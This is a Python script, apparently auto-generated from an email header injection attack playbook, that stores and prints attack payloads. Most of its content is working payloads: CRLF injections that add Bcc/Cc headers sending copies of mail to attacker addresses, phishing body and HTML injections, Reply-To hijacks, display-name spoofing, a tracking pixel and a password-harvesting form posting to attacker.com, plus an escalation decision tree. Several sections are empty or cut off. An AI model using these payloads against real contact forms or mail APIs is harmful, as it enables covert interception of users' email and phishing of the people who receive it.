#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/email-header-injection

Skill: SKILL: Email Header Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-email-header-injection.py --help
      python hack-skills-email-header-injection.py --list
      python hack-skills-email-header-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/email-header-injection'
TITLE = 'SKILL: Email Header Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: email-header-injection", "description: >-", "Email header injection and spoofing playbook. Use when testing contact forms, email APIs, password reset flows, or any feature that constructs SMTP messages with user-controlled fields. Covers CRLF injection in headers, SPF/DKIM/DMARC bypass, and phishing amplification."],
    'skill-email-header-injection-expert-attack-playbook': [],
    '0-related-routing': ["- [crlf-injection](../crlf-injection/SKILL.md) \u2014 general CRLF injection; email headers are a specific high-value sink", "- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) \u2014 when SMTP server is reachable via SSRF (gopher://smtp)", "- [open-redirect](../open-redirect/SKILL.md) \u2014 redirect in password-reset emails as phishing amplification"],
    '1-smtp-header-injection-fundamentals': ["SMTP headers are separated by CRLF (`\\r\\n`). If user input is placed into email headers without sanitization, injecting `%0d%0a` (or `\\r\\n`) adds arbitrary headers."],
    'injection-anatomy': ["Normal header construction:", "To: user@example.com\\r\\n", "Subject: Contact Form\\r\\n", "From: noreply@target.com\\r\\n", "Injected (via Subject field):", "Subject: Hello%0d%0aBcc: attacker@evil.com\\r\\n", "Result:", "Subject: Hello\\r\\n", "Bcc: attacker@evil.com\\r\\n"],
    'encoding-variants-to-try': [],
    '2-attack-scenarios': [],
    '2-1-bcc-injection-silent-email-exfiltration': ["Input field: email / name / subject", "Payload: victim@target.com%0d%0aBcc:attacker@evil.com", "Effect: attacker receives a copy of every email sent through this form"],
    '2-2-cc-injection-with-header-stacking': ["Payload in \"From name\" field:", "John%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com", "Result headers:", "From: John", "Cc: attacker@evil.com", "Bcc: spy@evil.com", "... (original headers continue)"],
    '2-3-body-injection-full-email-content-control': ["A blank line (`\\r\\n\\r\\n`) separates headers from body in SMTP:", "Payload in Subject:", "Urgent%0d%0a%0d%0aPlease click: https://evil.com/phish%0d%0a.%0d%0a", "Result:", "Subject: Urgent", "Please click: https://evil.com/phish", "(Blank line terminates headers, everything after is body)"],
    '2-4-reply-to-manipulation-for-phishing': ["Payload in From name:", "IT Support%0d%0aReply-To:attacker@evil.com", "Victim sees \"IT Support\" as sender", "Replies go to attacker@evil.com"],
    '2-5-content-type-injection-for-html-phishing': ["Payload:", "test%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Password Reset</h1><a href=\"https://evil.com\">Click here</a>", "Overrides Content-Type \u2192 renders HTML in email client"],
    '3-common-vulnerable-patterns': [],
    'php-mail': ["```php", "$to = $_POST['email'];", "$subject = $_POST['subject'];", "$message = $_POST['message'];", "$headers = \"From: noreply@target.com\";", "// ALL parameters are injectable:", "mail($to, $subject, $message, $headers);", "// $to injection:    victim@x.com%0d%0aCc:attacker@evil.com", "// $subject injection: Hello%0d%0aBcc:attacker@evil.com", "// $headers injection: From: x%0d%0aBcc:attacker@evil.com"],
    'python-smtplib': ["```python", "msg = f\"From: {user_from}\\r\\nTo: {user_to}\\r\\nSubject: {user_subject}\\r\\n\\r\\n{body}\"", "server.sendmail(from_addr, to_addr, msg)"],
    'user-from-user-subject-injectable-if-not-sanitized': [],
    'node-js-nodemailer': ["```javascript", "let mailOptions = {", "from: req.body.from,      // injectable", "to: 'admin@target.com',", "subject: req.body.subject, // injectable", "text: req.body.message", "transporter.sendMail(mailOptions);"],
    '4-spf-dkim-dmarc-bypass-techniques': [],
    '4-1-spf-sender-policy-framework-bypass': ["SPF validates the `MAIL FROM` envelope sender IP against DNS TXT records.", "```bash"],
    'check-spf-record': ["dig TXT target.com +short"],
    'look-for-v-spf1': [],
    'count-dns-lookups-each-include-a-mx-redirect-1-lookup': [],
    '10-lookups-permerror-bypassed': [],
    '4-2-dkim-domainkeys-identified-mail-bypass': ["DKIM signs specific headers with a domain key. Bypass vectors:", "```bash"],
    'check-dkim-selector': ["dig TXT selector._domainkey.target.com +short"],
    'common-selectors-google-default-s1-s2-k1-dkim': [],
    '4-3-dmarc-domain-based-message-authentication-bypass': ["DMARC requires SPF or DKIM to **align** with the `From:` header domain.", "```bash"],
    'check-dmarc': ["dig TXT _dmarc.target.com +short"],
    'look-for-v-dmarc1-p-none-quarantine-reject': [],
    '4-4-display-name-spoofing-works-everywhere': ["Even with perfect SPF/DKIM/DMARC, display name is not authenticated:", "From: \"admin@target.com\" <attacker@evil.com>", "From: \"IT Security Team - target.com\" <random@evil.com>", "From: \"noreply@target.com via Support\" <attacker@evil.com>", "Most email clients show only the display name in the inbox view. Mobile clients are especially vulnerable."],
    '5-mail-client-rendering-attacks': [],
    'css-based-data-exfiltration': ["```html", "<!-- In HTML email body -->", "<style>", "</style>", "<input id=\"secret\" value=\"TARGET_VALUE\">"],
    'remote-image-tracking': ["```html", "<img src=\"https://attacker.com/track?email=victim@target.com&t=TIMESTAMP\" width=\"1\" height=\"1\">", "<!-- Invisible pixel \u2014 confirms email was opened, leaks IP, client info -->"],
    'form-action-hijacking': ["```html", "<!-- Some email clients render forms -->", "<form action=\"https://attacker.com/phish\" method=\"POST\">", "<input name=\"password\" type=\"password\" placeholder=\"Confirm your password\">", "<button type=\"submit\">Verify</button>", "</form>"],
    '6-contact-form-email-api-injection': ["```text"],
    'rest-api': ["POST /api/send-email {\"to\":\"user@target.com\\r\\nBcc:attacker@evil.com\",\"subject\":\"Hello\",\"body\":\"Test\"}"],
    'url-encoded-form': ["name=John&email=victim%40target.com%0d%0aBcc%3aattacker%40evil.com&message=test"],
    'graphql': ["mutation { sendEmail(to:\"user@target.com\\r\\nBcc:attacker@evil.com\" subject:\"Test\" body:\"Hello\") }"],
    '7-testing-methodology': ["1. Find email features: contact forms, password reset, invite/share, newsletters", "2. Test CRLF: inject test%0d%0aX-Injected:true in each field \u2192 check received headers", "3. Escalate: Bcc injection \u2192 body injection \u2192 Content-Type override", "4. Parallel: dig TXT target.com (SPF) + dig TXT _dmarc.target.com (DMARC)"],
    '8-decision-tree': ["Found email-sending feature?", "\u251c\u2500\u2500 User input goes into email headers?", "\u2502   \u251c\u2500\u2500 YES \u2192 Test CRLF injection", "\u2502   \u2502   \u251c\u2500\u2500 %0d%0a in Subject/From/To field", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Extra header appears \u2192 CONFIRMED", "\u2502   \u2502   \u2502   \u2502   \u251c\u2500\u2500 Inject Bcc: \u2192 silent exfiltration", "\u2502   \u2502   \u2502   \u2502   \u251c\u2500\u2500 Inject body (blank line) \u2192 content control", "\u2502   \u2502   \u2502   \u2502   \u2514\u2500\u2500 Inject Reply-To: \u2192 redirect replies", "\u2502   \u2502   \u2502   \u2502", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Filtered? \u2192 Try encoding variants", "\u2502   \u2502   \u2502       \u251c\u2500\u2500 %250d%250a (double encode)", "\u2502   \u2502   \u2502       \u251c\u2500\u2500 %0a only (LF without CR)", "\u2502   \u2502   \u2502       \u2514\u2500\u2500 Unicode \\u000d\\u000a", "\u2502   \u2502   \u2502", "\u2502   \u2502   \u2514\u2500\u2500 All encodings blocked \u2192 check SPF/DKIM/DMARC", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 NO (user input only in body) \u2192 limited impact", "\u2502       \u2514\u2500\u2500 Check for HTML injection in email body", "\u2502           \u2514\u2500\u2500 If HTML rendered \u2192 phishing / CSS exfil", "\u251c\u2500\u2500 Want to spoof emails from target domain?", "\u2502   \u251c\u2500\u2500 Check SPF: dig TXT target.com", "\u2502   \u2502   \u251c\u2500\u2500 No SPF / +all / ~all \u2192 direct spoofing possible", "\u2502   \u2502   \u2514\u2500\u2500 -all \u2192 SPF blocks; check DKIM/DMARC", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Check DMARC: dig TXT _dmarc.target.com", "\u2502   \u2502   \u251c\u2500\u2500 No DMARC / p=none \u2192 spoofing delivered", "\u2502   \u2502   \u251c\u2500\u2500 p=quarantine \u2192 lands in spam but delivered", "\u2502   \u2502   \u2514\u2500\u2500 p=reject \u2192 blocked; try subdomain (sp= policy)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 All strict \u2192 Display name spoofing only", "\u2502       \u2514\u2500\u2500 \"admin@target.com\" <attacker@evil.com>", "\u2514\u2500\u2500 Testing password reset email?", "\u251c\u2500\u2500 Check for token in URL \u2192 open redirect chain?", "\u2502   \u2514\u2500\u2500 See ../open-redirect/SKILL.md", "\u2514\u2500\u2500 Check for host header injection \u2192 password reset poisoning", "\u2514\u2500\u2500 See ../http-host-header-attacks/SKILL.md"],
    '9-quick-reference-key-payloads': ["```text"],
    'bcc-injection-via-subject': ["Subject: Hello%0d%0aBcc:attacker@evil.com"],
    'body-injection-via-from-name': ["From: Test%0d%0a%0d%0aClick here: https://evil.com"],
    'reply-to-hijack': ["From: Support%0d%0aReply-To:attacker@evil.com"],
    'full-header-stack-injection': ["email=victim%40target.com%0d%0aCc%3aspy1%40evil.com%0d%0aBcc%3aspy2%40evil.com"],
    'display-name-spoof-no-injection-needed': ["From: \"security@target.com\" <attacker@evil.com>"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()